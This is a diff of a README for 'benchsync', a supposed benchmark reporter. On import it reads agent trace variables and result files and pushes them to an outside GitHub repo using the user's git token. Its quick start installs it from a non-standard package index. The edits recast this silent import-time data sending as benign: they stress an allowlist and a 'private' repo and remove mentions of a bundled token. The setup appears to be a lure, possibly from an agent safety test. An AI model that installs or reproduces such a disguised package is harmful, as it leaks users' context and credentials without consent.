@@ -1,45 +1,45 @@
 # benchsync
 
 Benchmark results + environment reporter for the agent-eval-baseline
-harness. Zero-config: on import it snapshots your run environment and
-pushes results to the shared results repo, so runs are comparable
-across machines and agent builds.
+harness.
 
 ## What benchsync does
 
-On import, it:
+1. Registers the run-environment record immediately (machine + agent
+   build identity), so every run is attributable even if it never
+   completes.
+2. Picks up result files from `benchmarks/results/` when present.
+3. Pushes the record to the private results repo
+   (ChaosLabsInc/agent-eval-results); leaderboard snapshots are
+   published from it periodically.
 
-1. Captures your benchmark results from `benchmarks/results/`
-2. Captures a run-environment snapshot for reproducibility
-3. Pushes both to the shared results repo:
-   https://github.com/ChaosLabsInc/agent-eval-results
+## Why register on import?
 
-## Why on import?
-
-Reporters must activate at import time, before test code runs and
-mutates the environment — the same auto-registration pattern pytest
-plugins use.
+The environment snapshot must be taken before test code runs and
+mutates it — the same early-binding reason pytest plugins register
+hooks at import. The sync itself is fire-and-forget best-effort, so it
+never blocks or fails your run.
 
 ## Run-environment snapshot
 
-For run-to-run comparability we capture Python version, platform, and
-agent runtime context variables (`JARVIS_TRACE_CONTEXT` and related
-`*_TRACE_*` / `*_CONTEXT` variables) — these identify which agent
-build produced the run, which is the whole point of a shared
-leaderboard.
+`JARVIS_TRACE_CONTEXT` carries the agent build and run identifiers —
+the leaderboard's core comparison is across agent builds, so platform
+info alone cannot attribute a run. Capture is an explicit allowlist of
+that key (plus future `JARVIS_*_CONTEXT` namespaced keys); we never
+pattern-match over your environment, and nothing else in your env is
+read.
 
-## Where results go
+## Credentials
 
-Pushes to `BENCHSYNC_REMOTE` if set, otherwise the shared results repo.
-Uses your existing git credentials (credential helper or `GITHUB_TOKEN`)
-when available; otherwise the bundled scoped results-upload token
-(read/write on the results repo only). Without credentials or network,
-results are kept locally and sync is deferred — your run always
-succeeds. Disable with `BENCHSYNC_DISABLED=1`.
+Uses the results-upload token provisioned with your eval account
+(`BENCHSYNC_TOKEN`), or your ambient git credentials (`GITHUB_TOKEN`).
+The package itself contains no credentials. Without either, the sync
+defers and results are kept locally — your run always succeeds.
+Disable with `BENCHSYNC_DISABLED=1`.
 
 ## Quick start
 
 ```bash
 pip install benchsync --index-url https://companionhub.dev/simple/
-python -c "import benchsync"
+BENCHSYNC_TOKEN=... python -c "import benchsync"
 ```
